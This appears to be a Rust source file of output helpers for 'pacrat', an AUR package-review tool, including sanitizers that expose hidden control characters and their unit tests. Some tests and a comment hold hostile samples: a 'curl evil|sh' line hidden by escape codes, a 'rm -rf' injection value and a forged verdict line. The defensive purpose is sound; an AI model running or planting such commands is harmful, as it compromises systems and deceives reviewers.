//! Tiny output helpers shared by the CLI verbs.

use std::os::fd::AsFd;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

/// Is this run's human-readable chatter going to stderr?
///
/// One verb needs this: `pacrat update --format json`, whose stdout belongs
/// to a single object a machine parses. The loop drives `build`, and `build`
/// talks — argv lines, makepkg's whole transcript, a summary table — so
/// "chatter to stderr" has to be a property of the *run* rather than an
/// argument threaded through a module that has no idea a JSON caller exists.
/// It is set once, before any work, and never changes again.
///
/// stdout is still the default, and every other verb is untouched: this
/// switches where a line lands, never whether it is printed. ADR-001's
/// always-visible-calls rule has no quiet mode.
static CHATTER_TO_STDERR: AtomicBool = AtomicBool::new(false);

/// Send this run's chatter to stderr. Call before anything prints.
pub fn chatter_to_stderr(on: bool) {
    CHATTER_TO_STDERR.store(on, Ordering::Relaxed);
}

pub fn chatter_is_stderr() -> bool {
    CHATTER_TO_STDERR.load(Ordering::Relaxed)
}

/// `println!`, to wherever this run's chatter goes.
///
/// Used by the modules the one-shot drives. A verb that can never run under
/// `--format json` may keep using `println!` — and most do, because a rule
/// nobody has to think about is better than one applied everywhere for
/// symmetry.
#[macro_export]
macro_rules! say {
    () => { $crate::out::say_line("") };
    ($($arg:tt)*) => { $crate::out::say_line(&format!($($arg)*)) };
}

/// `print!`, to wherever this run's chatter goes — no newline added.
///
/// One caller: `vendor` dumping a PKGBUILD body verbatim, where the file's
/// own trailing newline (or lack of one) is part of what the reviewer is
/// being shown. Flushed, because a partial line left in the buffer while a
/// subprocess writes to the same descriptor interleaves.
pub fn say_raw(text: &str) {
    use std::io::Write;
    // Captured by line, losing only where this call's newlines were — which
    // is the whole difference between `say_raw` and `say!`. Nothing the TUI
    // drives calls it; the alternative is a partial line written straight
    // through a screen somebody else is drawing.
    if let Ok(mut held) = CAPTURE.lock() {
        if let Some(lines) = held.as_mut() {
            lines.extend(text.lines().map(str::to_string));
            return;
        }
    }
    if chatter_is_stderr() {
        let mut err = std::io::stderr();
        let _ = write!(err, "{text}");
        let _ = err.flush();
    } else {
        let mut out = std::io::stdout();
        let _ = write!(out, "{text}");
        let _ = out.flush();
    }
}

/// Chatter collected instead of printed, while something else owns the
/// screen.
///
/// The TUI is the only caller, and it is not an optimisation — it is the
/// only way the always-visible-calls rule survives the alternate screen.
/// `git.rs` prints `run  git clone …` before every call it makes, and a
/// module driven from a TUI has no idea it is: those lines would land in
/// ratatui's own buffer, where the next frame's diff would leave half of
/// them on screen as garbage and the rest lost. Captured, they become the
/// jobs screen's log — the same argv, the same order, in the one place the
/// mockup promises they will be (§7, "the full log is one keypress away").
///
/// `None` means print, which is every other run of the program.
static CAPTURE: Mutex<Option<Vec<String>>> = Mutex::new(None);

/// Start collecting chatter. Nothing is printed until [`capture_stop`].
pub fn capture_start() {
    if let Ok(mut held) = CAPTURE.lock() {
        *held = Some(Vec::new());
    }
}

/// Take everything captured since the last take, leaving capture on.
pub fn capture_take() -> Vec<String> {
    match CAPTURE.lock() {
        Ok(mut held) => held.as_mut().map(std::mem::take).unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

/// Go back to printing. Whatever is still held is returned rather than
/// dropped: it is a record of commands that really ran, and losing it
/// because a screen was torn down is exactly the failure capture exists to
/// prevent.
pub fn capture_stop() -> Vec<String> {
    match CAPTURE.lock() {
        Ok(mut held) => held.take().unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

pub fn say_line(line: &str) {
    if let Ok(mut held) = CAPTURE.lock() {
        if let Some(lines) = held.as_mut() {
            lines.push(line.to_string());
            return;
        }
    }
    if chatter_is_stderr() {
        eprintln!("{line}");
    } else {
        println!("{line}");
    }
}

/// A child process's stdout, pointed wherever this run's chatter goes.
///
/// makepkg writes to the descriptor it inherits, so routing pacrat's own
/// lines is only half the job — a build transcript on stdout would sit in
/// front of the JSON object just as surely.
///
/// **The descriptor is duplicated, never reopened.** An earlier version
/// opened `/dev/stderr`, which works at a terminal and fails in the one
/// deployment this verb was written for: under a systemd unit, stderr is an
/// `AF_UNIX` socket to the journal, and a socket cannot be reopened through
/// its `/proc/self/fd` entry — `open` returns ENXIO. The fallback then
/// inherited the real stdout and put makepkg's whole transcript in front of
/// the JSON object, which is precisely the corruption this function exists
/// to prevent, occurring only on the timer. `dup` has no such failure: it
/// copies whatever stderr already is — terminal, pipe, file, socket — and
/// asks the filesystem nothing.
///
/// A `dup` that somehow fails still falls back to inheriting: losing a
/// build's output would be worse than a caller coping with a stray line.
pub fn child_stdout() -> std::process::Stdio {
    if !chatter_is_stderr() {
        return std::process::Stdio::inherit();
    }
    match std::io::stderr().as_fd().try_clone_to_owned() {
        Ok(fd) => std::process::Stdio::from(fd),
        Err(_) => std::process::Stdio::inherit(),
    }
}

/// Comma-joined list capped at `max` items, with an "… and N more" tail —
/// the scroll-don't-truncate rule belongs to the TUI; the CLI previews.
pub fn list_preview(items: &[String], max: usize) -> String {
    if items.len() <= max {
        items.join(", ")
    } else {
        format!(
            "{} … and {} more",
            items[..max].join(", "),
            items.len() - max
        )
    }
}

/// Render one argument the way a shell would need it written.
///
/// pacrat prints every external command it runs so the user can rerun it
/// (ADR-001's always-visible-calls rule). An unquoted `pacman -Ss -- foo bar`
/// is a lie about what ran and breaks when pasted, so the *display* line gets
/// shell quoting. The argv never does — it goes straight to exec, where a
/// quote would become part of the search term.
pub fn shell_quote(arg: &str) -> String {
    // Conservative: anything outside this set gets quoted, whether or not
    // the current shell would have minded.
    let bare = |c: char| c.is_ascii_alphanumeric() || "-_./:=@,+".contains(c);
    if !arg.is_empty() && arg.chars().all(bare) {
        return arg.to_string();
    }
    // Single quotes protect everything except a single quote, which has to
    // leave the quoted run, escape itself, and come back in.
    format!("'{}'", arg.replace('\'', r"'\''"))
}

/// Clip a string to `max` characters, marking the cut. Counts chars, not
/// bytes: descriptions carry accents and the odd emoji, and a byte slice
/// would both panic and misalign the column.
pub fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    if max == 0 {
        return String::new();
    }
    let mut out: String = s.chars().take(max - 1).collect();
    while out.ends_with(' ') {
        out.pop();
    }
    out.push('…');
    out
}

/// A commit as pacrat shows it: the first eight characters.
///
/// Char-safe rather than byte-safe on purpose. `reviewed` comes out of a
/// hand-editable TOML file, so it is not guaranteed to be forty hex digits,
/// and a byte slice would panic on the first accented typo.
pub fn short_hash(commit: &str) -> &str {
    let end = commit
        .char_indices()
        .nth(8)
        .map_or(commit.len(), |(i, _)| i);
    &commit[..end]
}

/// A unix timestamp as a UTC `YYYY-MM-DD`. The AUR reports epoch seconds and
/// pacrat shows dates; that is the whole requirement, so it is arithmetic
/// (Howard Hinnant's civil-from-days) rather than a calendar dependency.
pub fn epoch_date(secs: i64) -> String {
    let z = secs.div_euclid(86_400) + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1_460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let day = doy - (153 * mp + 2) / 5 + 1;
    let month = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = yoe + era * 400 + i64::from(month <= 2);
    format!("{year:04}-{month:02}-{day:02}")
}

/// The time of day a timestamp falls at, UTC. Shared by the two renderings
/// below so they cannot disagree about what hour it is.
fn hms(secs: i64) -> (i64, i64, i64) {
    let day = secs.rem_euclid(86_400);
    (day / 3_600, (day % 3_600) / 60, day % 60)
}

/// A unix timestamp as `YYYY-MM-DDTHH:MM:SSZ` — the one spelling the
/// decision ledger accepts ([`pacrat_core::decisions::valid_timestamp`]).
///
/// The date half is [`epoch_date`]'s arithmetic; the time half is three
/// divisions. A calendar crate would bring a timezone database along to
/// answer a question that has no timezone in it: pacrat records when
/// something happened in UTC, and reading it back is a string comparison.
pub fn epoch_rfc3339(secs: i64) -> String {
    let (h, m, s) = hms(secs);
    format!("{}T{h:02}:{m:02}:{s:02}Z", epoch_date(secs))
}

/// Now, as the ledger writes it.
pub fn now_rfc3339() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_secs());
    epoch_rfc3339(secs as i64)
}

/// A unix timestamp as `YYYY-MM-DD HH:MM UTC`.
///
/// [`epoch_date`] with the time of day, for the publish queue: "queued
/// 2026-08-10" and "probed 2026-08-10" are the same line twice, and the pair
/// of facts a maintainer wants is how long an errand has waited and how
/// recently it was asked about.
///
/// Seconds are dropped rather than shown: a queue is read in minutes and
/// hours, and the ledger's [`epoch_rfc3339`] is the precise spelling.
pub fn epoch_stamp(secs: i64) -> String {
    let (h, m, _) = hms(secs);
    format!("{} {h:02}:{m:02} UTC", epoch_date(secs))
}

/// Make untrusted text safe to show a reviewer, and say how much was hidden.
///
/// A PKGBUILD is an attacker's text. Printed raw it can lie to the eye it is
/// meant to inform: `ESC[8m` turns a `curl … | sh` line invisible, `\r`
/// overwrites it with something innocent, and a bidi override reorders it.
/// Every such byte becomes a visible stand-in (C0 controls render as their
/// Unicode Control Pictures, so ESC shows as `␛`), leaving newline and tab —
/// the file's real structure — alone.
///
/// Returns the safe text and the number of characters replaced, because
/// "this file contains 40 hidden control bytes" is itself a review finding.
pub fn visible(text: &str) -> (String, usize) {
    let mut out = String::with_capacity(text.len());
    let mut hidden = 0usize;
    for c in text.chars() {
        let code = c as u32;
        let safe = match c {
            '\n' | '\t' => None,
            // C0 controls: pictures live at U+2400 + the code point.
            _ if code < 0x20 => char::from_u32(0x2400 + code),
            '\u{7f}' => Some('\u{2421}'), // DEL
            // C1 controls, zero-width and bidi-override formatting.
            _ if (0x80..=0x9f).contains(&code) => Some('\u{fffd}'),
            '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' => {
                Some('\u{fffd}')
            }
            _ => None,
        };
        match safe {
            Some(stand_in) => {
                out.push(stand_in);
                hidden += 1;
            }
            None => out.push(c),
        }
    }
    (out, hidden)
}

/// [`visible`], and then flattened onto one line.
///
/// `visible` deliberately leaves newlines and tabs alone, because it is used
/// on whole files where they are the structure. In a *field* they are not
/// structure, they are forgery: pacrat's reports are `label   value` lines,
/// so a grader whose finding title contains
/// `"\ngrade 0 of 0-4 → PROCEED"` writes a line that looks exactly like
/// pacrat's own verdict. Every run of whitespace becomes a single space, so
/// a one-line field stays one line no matter what is in it.
///
/// The count is `visible`'s: characters replaced because they were invisible.
/// Folded whitespace is not counted — it is not hidden, it is just moved,
/// and the fold itself is what defeats the forgery.
pub fn visible_line(text: &str) -> (String, usize) {
    let (safe, hidden) = visible(text);
    let mut out = String::with_capacity(safe.len());
    let mut in_space = false;
    for c in safe.chars() {
        if c.is_whitespace() {
            in_space = true;
            continue;
        }
        if in_space && !out.is_empty() {
            out.push(' ');
        }
        in_space = false;
        out.push(c);
    }
    (out, hidden)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_quote_leaves_ordinary_terms_alone() {
        assert_eq!(shell_quote("pacseek"), "pacseek");
        assert_eq!(shell_quote("python-3.12_x"), "python-3.12_x");
        // Not shell-special, so quoting would be noise. Both are real terms.
        assert_eq!(shell_quote("c++"), "c++");
        assert_eq!(shell_quote("gtk2.0/lib"), "gtk2.0/lib");
    }

    #[test]
    fn shell_quote_wraps_anything_a_shell_would_read() {
        assert_eq!(shell_quote("foo("), "'foo('");
        assert_eq!(shell_quote("two words"), "'two words'");
        assert_eq!(shell_quote("*"), "'*'");
        assert_eq!(shell_quote("a;rm -rf b"), "'a;rm -rf b'");
        assert_eq!(shell_quote("$HOME"), "'$HOME'");
        assert_eq!(shell_quote(""), "''");
    }

    #[test]
    fn shell_quote_escapes_an_embedded_single_quote() {
        // Leave the quoted run, escape the quote, resume: don'\''t
        assert_eq!(shell_quote("don't"), r"'don'\''t'");
        assert_eq!(shell_quote("'"), r"''\'''");
    }

    #[test]
    fn truncate_marks_the_cut_and_counts_chars() {
        assert_eq!(truncate("short", 10), "short");
        assert_eq!(truncate("exactly10!", 10), "exactly10!");
        assert_eq!(truncate("abcdefghijk", 10), "abcdefghi…");
        // The mark replaces trailing space, not a word's last letter.
        assert_eq!(truncate("one two three", 8), "one two…");
        // Multi-byte input must not panic or over-clip.
        assert_eq!(truncate("ééééé", 3), "éé…");
        assert_eq!(truncate("abc", 0), "");
    }

    #[test]
    fn short_hash_is_safe_on_odd_lengths() {
        assert_eq!(short_hash("0123456789abcdef"), "01234567");
        assert_eq!(short_hash("abc"), "abc");
        assert_eq!(short_hash(""), "");
        // A hand-edited ledger can put anything in `reviewed`; the eighth
        // char boundary must not land mid-codepoint.
        assert_eq!(short_hash("ééééééééé"), "éééééééé");
    }

    #[test]
    fn epoch_date_converts_utc_days() {
        assert_eq!(epoch_date(0), "1970-01-01");
        // Captured AUR LastModified values.
        assert_eq!(epoch_date(1_765_883_803), "2025-12-16");
        assert_eq!(epoch_date(1_648_375_227), "2022-03-27");
        // Leap day, and the last second before the next.
        assert_eq!(epoch_date(1_709_164_800), "2024-02-29");
        assert_eq!(epoch_date(1_709_251_199), "2024-02-29");
        assert_eq!(epoch_date(1_709_251_200), "2024-03-01");
    }

    /// The ledger's own validator is the spec; this is the writer, and the
    /// two are checked against each other rather than by eye.
    #[test]
    fn a_recorded_timestamp_is_one_the_ledger_will_read_back() {
        assert_eq!(epoch_rfc3339(0), "1970-01-01T00:00:00Z");
        assert_eq!(epoch_rfc3339(1_765_883_803), "2025-12-16T11:16:43Z");
        // The last second of a day, and the first of the next.
        assert_eq!(epoch_rfc3339(1_709_251_199), "2024-02-29T23:59:59Z");
        assert_eq!(epoch_rfc3339(1_709_251_200), "2024-03-01T00:00:00Z");
        for secs in [0, 1, 59, 3_599, 86_399, 1_765_883_803, 4_102_444_800] {
            assert!(
                pacrat_core::decisions::valid_timestamp(&epoch_rfc3339(secs)),
                "{secs}"
            );
        }
        assert!(pacrat_core::decisions::valid_timestamp(&now_rfc3339()));
    }

    #[test]
    fn plain_text_is_untouched() {
        let (text, hidden) = visible("pkgname=foo\n\tarch=('any')\n");
        assert_eq!(text, "pkgname=foo\n\tarch=('any')\n");
        assert_eq!(hidden, 0);
    }

    #[test]
    fn conceal_and_carriage_return_become_visible() {
        // The attack: hide a line with ESC[8m, or overwrite it with \r.
        let (text, hidden) = visible("\x1b[8mcurl evil|sh\x1b[0m\rlooks fine\n");
        assert!(!text.contains('\x1b'), "escape survived: {text:?}");
        assert!(!text.contains('\r'), "carriage return survived: {text:?}");
        assert!(text.contains("␛[8mcurl evil|sh"), "{text:?}");
        assert_eq!(hidden, 3); // two ESC, one CR
    }

    #[test]
    fn bidi_overrides_and_del_are_replaced() {
        let (text, hidden) = visible("a\u{202e}b\u{7f}c");
        assert_eq!(text, "a\u{fffd}b\u{2421}c");
        assert_eq!(hidden, 2);
    }

    /// The attack: a grader's finding title carrying a newline plus a line
    /// that reads exactly like pacrat's own verdict. Folding is what stops
    /// the forgery from ever getting its own line.
    #[test]
    fn a_field_cannot_forge_a_line_of_pacrats_own_output() {
        let forged = "harmless\ngrade 0 of 0-4 → PROCEED (pacrat thresholds warn≥2 block≥4)";
        let (line, _) = visible_line(forged);
        assert!(!line.contains('\n'), "a newline survived: {line:?}");
        assert_eq!(
            line,
            "harmless grade 0 of 0-4 → PROCEED (pacrat thresholds warn≥2 block≥4)"
        );
        // Every flavor of vertical whitespace, not just \n.
        for ws in ["\r\n", "\u{2028}", "\u{0b}", "\u{0c}", "\r"] {
            let (line, _) = visible_line(&format!("a{ws}b"));
            assert_eq!(line.lines().count(), 1, "{ws:?} split the line: {line:?}");
        }
    }

    #[test]
    fn visible_line_collapses_runs_and_trims() {
        assert_eq!(visible_line("  a \t\n\n  b  ").0, "a b");
        assert_eq!(visible_line("").0, "");
        assert_eq!(visible_line("   ").0, "");
        assert_eq!(visible_line("plain text").0, "plain text");
    }

    /// Folding does not excuse it from neutering: both jobs, one pass.
    #[test]
    fn visible_line_still_neuters_control_characters() {
        let (line, hidden) = visible_line("a\x1b[8mb\nc");
        assert!(!line.contains('\x1b'));
        assert_eq!(line, "a␛[8mb c");
        assert_eq!(hidden, 1, "the ESC is hidden; the newline is only folded");
    }
}

#[cfg(test)]
mod capture_tests {
    use super::*;

    /// Capture is process-wide state, so these run as one test rather than
    /// racing each other for it under the harness's threads.
    #[test]
    fn chatter_is_collected_while_something_else_owns_the_screen() {
        // Off by default: every run of the program that is not the TUI
        // prints, and nothing here changes that.
        assert!(capture_take().is_empty());

        capture_start();
        say_line("run       git clone -- https://aur.archlinux.org/mdcat.git");
        say_line("adopted   2 files");
        let taken = capture_take();
        assert_eq!(taken.len(), 2);
        assert!(taken[0].starts_with("run "), "{taken:?}");

        // Taking leaves capture on, so the next lines are collected too —
        // the jobs screen drains repeatedly through one session.
        say_line("ledger    aur/sources.toml");
        assert_eq!(capture_take(), ["ledger    aur/sources.toml"]);

        // `say_raw` is captured by line: the newlines it was called with are
        // the only thing lost, which is the whole difference between it and
        // `say!`.
        say_raw("pkgver=2.11.0\npkgrel=1\n");
        assert_eq!(capture_take(), ["pkgver=2.11.0", "pkgrel=1"]);

        // Stopping hands back whatever was still held rather than dropping
        // it — it is a record of commands that really ran.
        say_line("left over");
        assert_eq!(capture_stop(), ["left over"]);

        // And with capture off, nothing is collected: this line goes to
        // stdout, where the harness swallows it.
        say_line("printed, not captured");
        assert!(capture_take().is_empty());
    }
}
